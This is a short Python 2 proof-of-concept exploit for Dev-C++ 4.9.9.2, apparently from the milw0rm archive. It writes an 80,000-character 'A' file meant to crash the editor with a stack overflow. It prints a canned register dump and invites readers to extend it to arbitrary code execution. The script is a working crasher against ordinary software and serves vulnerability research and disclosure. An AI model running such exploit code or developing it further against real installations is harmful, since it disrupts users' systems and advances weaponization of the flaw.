#!/usr/bin/env python
print "--------------------------------------------------------------"
print "Dev-C++ 4.9.9.2 Stack Overflow"
print "url: http://www.bloodshed.net/"
print "author: shinnai"
print "mail: shinnai[at]autistici[dot]org"
print "site: http://shinnai.altervista.org"
print "--------------------------------------------------------------"

try:
   char = "\x41" * 80000

   out_file = open('DevCpp.cpp','wb')
   out_file.write(char)
   out_file.close()

   print "File succesfully created!\n\n"
   print "Here is a dump:"
   print "----------------------------------------------------------------"
   print "pid=0A58 tid=04C4  EXCEPTION (first-chance)"
   print "----------------------------------------------------------------"
   print "Exception C00000FD (STACK_OVERFLOW)"
   print "----------------------------------------------------------------"
   print "EAX=00000674: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??"
   print "EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??"
   print "ECX=00404358: 8B 44 24 04 F7 40 04 06-00 00 00 0F 85 89 00 00"
   print "EDX=7C9137D8: 8B 4C 24 04 F7 41 04 06-00 00 00 B8 01 00 00 00"
   print "ESP=00032E1C: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00"
   print "EBP=000334A0: CC 34 03 00 7C 43 40 00-B0 34 03 00 BF 37 91 7C"
   print "ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??"
   print "EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??"
   print "EIP=7C8024E0: 53 56 57 8B 45 F8 89 65-E8 50 8B 45 FC C7 45 FC"
   print "              --> PUSH EBX"
   print
"----------------------------------------------------------------\n"
   print "Encreasing the number of characters will change the results of"
   print "this exploit. For example try with 1000000 of characters and see"
   print "what happen."
   print "I was unable to execute arbitrary code but I think someone
better"
   print "than me can succesfully exploit it :P\n"
except:
   print "Unable to create file!"

# milw0rm.com [2007-01-30]
